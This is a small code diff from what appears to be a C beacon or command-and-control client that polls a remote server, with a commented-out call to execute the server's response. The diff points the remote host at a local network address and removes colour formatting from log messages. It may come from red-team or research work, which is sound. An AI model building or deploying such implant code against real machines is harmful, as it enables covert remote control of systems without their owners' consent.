@@ -64,7 +64,7 @@
 #include "ssh.h"
 #include "socks.h"
 
-#define RHOST "127.0.0.1"
+#define RHOST "192.168.1.13"
 #define RPORT 8000
 #define RPORT_STR "8000"
 #define BEACON_RESP_MAX_SIZE 1024
@@ -962,10 +962,10 @@ int main(int argc, char *argv[])
 			CLOSE(sockfd);
 			if (response) {
 				printf("[*] Server response:\n%s\n", response);
-				printf(BLUE("[*] Preparing execution...\n"));
+				printf("[*] Preparing execution...\n");
 				//parse_and_exec(response);
 				free(response);
-				printf(BLUE("[*] Resuming main loop\n"));
+				printf("[*] Resuming main loop\n");
 				SLEEP(timeout);
 			} else {
 				printf("[-] No response received\n");
